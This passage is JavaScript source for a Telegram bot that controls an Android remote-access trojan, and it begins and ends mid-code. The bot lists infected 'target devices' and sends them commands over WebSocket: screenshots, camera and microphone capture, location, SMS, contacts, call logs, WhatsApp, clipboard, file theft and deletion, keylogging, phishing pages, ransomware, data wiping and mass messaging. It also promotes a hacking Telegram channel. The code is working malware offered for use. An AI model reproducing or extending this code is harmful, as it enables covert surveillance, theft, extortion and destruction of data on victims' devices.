        '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴚᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
        '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
        '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 https://t.me/SLTAN_HKBLVC2017 \n\n' +
        '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @KINGOF_Hack0098 \n\n' +
        '• 🧭𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹👉 https://t.me/SLTAN_HKBLVC2017 \n\n' +
        '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [
                    ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                    ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                    ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                ],
                'resize_keyboard': true
            }
        }
    )
}

function listConnectedDevices(chatId) {
    if (appClients.size === 0) {
        appBot.sendMessage(chatId,
            '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
            '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        );
        return;
    }

    let text = `°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 (${appClients.size}):\n\n`;
    let counter = 1;
    
    appClients.forEach((ws, uuid) => {
        const device = ws.deviceInfo;
        const uptime = Math.floor((Date.now() - device.connectedAt) / 1000);
        text += `🔹 <b>Device ${counter}</b>\n` +
               `• ᴍᴏᴅᴇʟ : <b>${device.model}</b>\n` +
               `• ʙᴀᴛᴛᴇʀʏ : <b>${device.battery}</b>\n` +
               `• ᴠᴇʀꜱɪᴏɴ : <b>${device.version}</b>\n` +
               `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${device.provider}</b>\n` +
               `• ᴜᴘᴛɪᴍᴇ : <b>${uptime}s</b>\n` +
               `• ɪᴅ : <code>${uuid}</code>\n\n`;
        counter++;
    });
    
    appBot.sendMessage(chatId, text, {parse_mode: "HTML"});
}

function showDeviceSelection(chatId) {
    if (appClients.size === 0) {
        appBot.sendMessage(chatId,
            '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
            '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        );
        return;
    }

    const deviceListKeyboard = [];
    appClients.forEach((ws, uuid) => {
        const device = ws.deviceInfo;
        deviceListKeyboard.push([{
            text: `📱 ${device.model} (${device.battery}%)`,
            callback_data: 'device:' + uuid
        }]);
    });

    deviceListKeyboard.push([{
        text: '📢 𝙎𝙚𝙣𝙙 𝙩𝙤 𝘼𝙡𝙡 𝘿𝙚𝙫𝙞𝙘𝙚𝙨',
        callback_data: 'broadcast:all'
    }]);

    appBot.sendMessage(chatId, `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 (${appClients.size} devices connected)`, {
        "reply_markup": {
            "inline_keyboard": deviceListKeyboard,
        },
        parse_mode: "HTML"
    });
}

function showSystemStatus(chatId) {
    const now = Date.now();
    let activeDevices = 0;
    
    appClients.forEach((ws) => {
        if (now - ws.deviceInfo.lastPing < 30000) {
            activeDevices++;
        }
    });

    const statusText = `📊 <b>System Status</b>\n\n` +
        `• 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝘿𝙚𝙫𝙞𝙘𝙚𝙨: <b>${appClients.size}</b>\n` +
        `• 𝘼𝙘𝙩𝙞𝙫𝙚 𝘿𝙚𝙫𝙞𝙘𝙚𝙨: <b>${activeDevices}</b>\n` +
        `• 𝙎𝙚𝙧𝙫𝙚𝙧 𝙐𝙥𝙩𝙞𝙢𝙚: <b>${Math.floor(process.uptime())}s</b>\n` +
        `• 𝙈𝙚𝙢𝙤𝙧𝙮 𝙐𝙨𝙖𝙜𝙚: <b>${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)}MB</b>\n` +
        `• 𝙉𝙤𝙙𝙚.𝙟𝙨 𝙑𝙚𝙧𝙨𝙞𝙤𝙣: <b>${process.version}</b>`;
    
    appBot.sendMessage(chatId, statusText, {parse_mode: "HTML"});
}

function startBroadcastCommand(chatId) {
    if (appClients.size === 0) {
        appBot.sendMessage(chatId, '°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙛𝙤𝙧 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩');
        return;
    }
    
    appBot.sendMessage(chatId,
        '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙩𝙤 𝙖𝙡𝙡 𝙙𝙚𝙫𝙞𝙘𝙚𝙨\n\n' +
        '• 𝙁𝙤𝙧𝙢𝙖𝙩: <code>command:parameter</code>\n' +
        '• 𝙀𝙭𝙖𝙢𝙥𝙡𝙚: <code>toast:Hello All Devices</code>',
        {parse_mode: "HTML", reply_markup: {force_reply: true}}
    );
}

function broadcastToAll(command) {
    let successCount = 0;
    let failCount = 0;
    
    appClients.forEach((ws, uuid) => {
        try {
            if (ws.readyState === webSocket.OPEN) {
                ws.send(command);
                successCount++;
            } else {
                failCount++;
            }
        } catch (error) {
            console.error(`Error sending to device ${uuid}:`, error);
            failCount++;
        }
    });
    
    return { success: successCount, fail: failCount };
}

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (command === 'broadcast' && uuid === 'all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙩𝙤 𝙖𝙡𝙡 𝙙𝙚𝙫𝙞𝙘𝙚𝙨\n\n' +
            '• 𝙁𝙤𝙧𝙢𝙖𝙩: <code>command:parameter</code>\n' +
            '• 𝙀𝙭𝙖𝙢𝙥𝙡𝙚: <code>toast:Hello All Devices</code>',
            {parse_mode: "HTML", reply_markup: {force_reply: true}}
        );
        return;
    }

    if (command == 'device') {
        const device = appClients.get(uuid)?.deviceInfo;
        if (!device) {
            appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device not found!' });
            return;
        }

        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${device.model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '🖼️برنامه ها 🖼️', callback_data: `apps:${uuid}`},
                        {text: '🚨اطلاعات دستگاه 🚨', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂دریافت فایل ها 📂', callback_data: `file:${uuid}`},
                        {text: '👹حذف فایل ها 👹', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '🎟شات صفحه 🎟️', callback_data: `screenshot:${uuid}`},
                        {text: '👾واتساپ 👾', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: '🌀کیبورد 🌀', callback_data: `clipboard:${uuid}`},
                        {text: '🥎میکروفون 🥎', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '🔰دوربین اصلی 🔰', callback_data: `camera_main:${uuid}`},
                        {text: '🎪دوربین سفلی 🎪', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🌐موقیعت مکانی 🌐', callback_data: `location:${uuid}`},
                        {text: '🗯اعلان ها🗯️', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📮دریافت پرداخت 📮', callback_data: `Settings:${uuid}`},
                        {text: '☢️بازنشانی دستگاه ☢️', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '☃️تاریخه چه تماس ها ☃️', callback_data: `calls:${uuid}`},
                        {text: '🏆مخاطبین 🏆', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '⏲لرزش ⏲️', callback_data: `vibrate:${uuid}`},
                        {text: '🔔علان 🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '🧊SMS🧊', callback_data: `messages:${uuid}`},
                        {text: '🎁ارسال پیام 🎁', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🚸باج افزار 🚸', callback_data: `Ransomware:${uuid}`},
                        {text: '✳️صفحه فیشینگ ✳️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🦞پخش صدا 🦞', callback_data: `play_audio:${uuid}`},
                        {text: '☯️توقف صدا ☯️', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '⛔‼️ارسال پیام به همه مخاطبین ‼️⛔',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: '🔒رمزگذاری داده 🔒', callback_data: `encrypt_data:${uuid}`},
                        {text: '🔓رمزگشایی داده 🔓', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: '🔮فعال کردن کیلاگر 🔮', callback_data: `keylogger_on:${uuid}`},
                        {text: '⛽ غیر فعال کردن کیلاگر ⛽', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            }
        })
        
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
    }
    else if (command == 'calls') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('calls');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'contacts') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('contacts');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'messages') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('messages');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'apps') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('apps');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'device_info') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('device_info');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'clipboard') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('clipboard');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'camera_main') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('camera_main');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'camera_selfie') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('camera_selfie');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'location') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('location');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'vibrate') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('vibrate');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'stop_audio') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('stop_audio');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'screenshot') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('screenshot');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'whatsapp') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('whatsapp');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
